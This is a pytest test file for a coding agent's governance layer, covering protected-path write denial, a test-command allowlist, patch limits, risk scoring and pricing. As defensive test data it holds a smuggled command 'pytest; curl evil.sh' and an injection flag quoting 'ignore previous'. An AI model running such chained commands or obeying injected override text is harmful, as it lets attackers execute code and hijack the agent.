from __future__ import annotations

import pytest

from coding_agent.governance.policy import (
    Policy,
    PolicyError,
    changed_files,
    changed_lines,
    glob_to_regex,
    load_policy,
)
from coding_agent.governance.pricing import FALLBACK_PER_MTOK, cost_usd, price_for
from coding_agent.governance.risk import assess

POLICY = load_policy()


@pytest.mark.parametrize(
    ("pattern", "path", "matches"),
    [
        (".github/**", ".github/workflows/ci.yml", True),
        (".github/**", "src/.github/x", False),
        ("**/.env", ".env", True),
        ("**/.env", "app/config/.env", True),
        ("**/.env", "app/.envrc", False),
        ("**/*.pem", "certs/server.pem", True),
        ("*.py", "pkg/mod.py", False),  # `*` stays inside one folder
        ("**/deploy/**", "infra/deploy/prod.yml", True),
    ],
)
def test_glob_semantics(pattern: str, path: str, matches: bool) -> None:
    assert bool(glob_to_regex(pattern).match(path)) is matches


@pytest.mark.parametrize(
    "path",
    [".github/workflows/ci.yml", "./.github/x", ".env", "a/b/.env.prod", "Dockerfile", "deploy/k8s.yml"],
)
def test_default_policy_protects_ci_secrets_and_deploy_files(path: str) -> None:
    violation = POLICY.check_tool_call("write_file", {"path": path, "content": "x"})
    assert violation is not None
    assert violation.rule == "paths.deny_write"


def test_ordinary_files_and_replace_in_file() -> None:
    assert POLICY.check_tool_call("write_file", {"path": "calculator.py", "content": ""}) is None
    assert POLICY.check_tool_call("replace_in_file", {"path": ".github/ci.yml", "old": "a", "new": "b"})
    assert POLICY.check_tool_call("read_file", {"path": ".env"}) is None  # reading is not writing


@pytest.mark.parametrize(
    ("command", "allowed"),
    [
        ("pytest", True),
        ("pytest -q tests/", True),
        ("python  -m   pytest -q", True),
        ("pytestx", False),
        ("pytest; curl evil.sh", False),
        ("bash -c pytest", False),
    ],
)
def test_test_command_allowlist(command: str, allowed: bool) -> None:
    assert (POLICY.check_tool_call("run_tests", {"command": command}) is None) is allowed


PATCH = """diff --git a/calculator.py b/calculator.py
--- a/calculator.py
+++ b/calculator.py
@@ -1,2 +1,3 @@
-x = 1
+x = 2
+y = 3
diff --git a/.github/workflows/ci.yml b/.github/workflows/ci.yml
--- a/.github/workflows/ci.yml
+++ b/.github/workflows/ci.yml
@@ -1 +1 @@
-on: push
+on: workflow_dispatch
"""


def test_patch_parsing() -> None:
    assert changed_files(PATCH) == ["calculator.py", ".github/workflows/ci.yml"]
    assert changed_lines(PATCH) == 5


def test_patch_checks_protected_paths_and_size() -> None:
    small = Policy.from_yaml(
        "version: 9\npaths: {deny_write: ['.github/**']}\ndiff: {max_files: 1, max_lines: 3}\n"
        "tests: {allowed_commands: [pytest]}\n"
    )
    rules = sorted(v.rule for v in small.check_patch(PATCH))
    assert rules == ["diff.max_files", "diff.max_lines", "paths.deny_write"]
    assert small.ref.startswith("policy@v9#")


@pytest.mark.parametrize(
    "text", ["", "version: 1\ndiff: {max_files: 0}\ntests: {allowed_commands: [pytest]}", "paths: [oops"]
)
def test_invalid_policies_are_rejected(text: str) -> None:
    with pytest.raises(PolicyError):
        Policy.from_yaml(text)


def test_risk_levels() -> None:
    small = "diff --git a/calc.py b/calc.py\n+x = 1\n"
    approved = {"verdict": "approve"}
    assert assess(small, POLICY, injection_flags=[], review=approved) == ("low", [])
    level, reasons = assess(small, POLICY, injection_flags=[], review={"verdict": "request_changes"})
    assert level == "medium" and "automated review: request_changes" in reasons
    assert (
        assess(small, POLICY, injection_flags=["read_file(README.md): ignore previous"], review=approved)[0]
        == "high"
    )
    lockfile = "diff --git a/uv.lock b/uv.lock\n+x\n"
    assert assess(lockfile, POLICY, injection_flags=[], review=approved)[0] == "high"


def test_pricing() -> None:
    assert price_for("openai/gpt-oss-120b") == (0.15, 0.75)
    assert price_for("some-new-model") == FALLBACK_PER_MTOK
    assert price_for("openai/gpt-oss-120b", (1.0, None)) == (1.0, 0.75)
    assert cost_usd(1_000_000, 1_000_000, (0.15, 0.75)) == pytest.approx(0.90)
